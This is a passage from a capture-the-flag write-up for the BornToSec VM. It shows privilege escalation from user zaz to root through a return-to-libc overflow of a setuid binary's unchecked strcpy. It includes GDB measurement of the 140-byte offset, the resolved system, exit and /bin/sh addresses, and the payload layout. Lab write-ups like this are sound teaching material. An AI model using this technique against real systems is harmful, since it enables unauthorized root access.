### From zaz to root: return-to-libc

The turtle result gets us to `zaz`, not root. On the running BornToSec VM I
confirmed the account and inspected the program in its home directory.

```text
zaz@BornToSecHackMe:~$ id
uid=1005(zaz) gid=1005(zaz) groups=1005(zaz)
zaz@BornToSecHackMe:~$ ls -l /home/zaz/exploit_me
-rwsr-s--- 1 root zaz 4880 Oct  8  2015 /home/zaz/exploit_me
zaz@BornToSecHackMe:~$ file /home/zaz/exploit_me
/home/zaz/exploit_me: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x2457e2f88d6a21c3893bc48cb8f2584bcd39917e, not stripped
zaz@BornToSecHackMe:~$ readelf -h /home/zaz/exploit_me | grep Type:
  Type:                              EXEC (Executable file)
zaz@BornToSecHackMe:~$ cat /proc/sys/kernel/randomize_va_space
0
```

The setuid bit makes the program run with effective UID 0. Its executable
type is fixed-address, and this VM has address randomization disabled. Neither
fact alone makes us root: we still need to redirect the program's control
flow. These selected disassembly lines show why that is possible:

```text
zaz@BornToSecHackMe:~$ objdump -d -M intel /home/zaz/exploit_me | grep -E '<main>:|80483fa:|8048419:|8048420:|8048436:|8048437:'
080483f4 <main>:
 80483fa: sub    esp,0x90
 8048419: lea    eax,[esp+0x10]
 8048420: call   8048300 <strcpy@plt>
 8048436: leave
 8048437: ret
```

`strcpy` copies our first argument to a stack buffer without a length
check. To measure where the saved return address starts, I ran the program
under GDB with 140 `A` bytes followed by four `B` bytes. GDB is used
only to measure the overwrite; the final identity check is in a normal
setuid process. Alternatively, we can use the [offset calculator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/).

```text
zaz@BornToSecHackMe:~$ gdb -q /home/zaz/exploit_me
(gdb) run $(python -c 'print "A" * 140 + "BBBB"')
(gdb) info registers eip esp ebp
```

```text
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
eip            0x42424242
```

`0x42` is ASCII `B`, so byte 140 is the first byte of the saved return
address. I then resolved the functions and the `/bin/sh` string in the
target's own libc:

```text
(gdb) break main
(gdb) run AAA
(gdb) p/x (void *)system
(gdb) p/x (void *)exit
(gdb) info proc mappings
(gdb) quit
zaz@BornToSecHackMe:~$ strings -t x /lib/i386-linux-gnu/libc.so.6 | grep -m1 /bin/sh
```

```text
system = 0xb7e6b060
exit   = 0xb7e5ebe0
libc mapping starts at 0xb7e2c000
/bin/sh has libc file offset 0x160c58
0xb7e2c000 + 0x160c58 = 0xb7f8cc58
```

The generator [exploit_me.py](./scripts/exploit_me.py) packs the three addresses
in little-endian order after the 140-byte padding:

```text
[140 bytes padding][system address][exit address][/bin/sh address]
```

When `main` returns, it enters `system("/bin/sh")`. The next word is the
return address for `system`, and the word after that is its string argument.
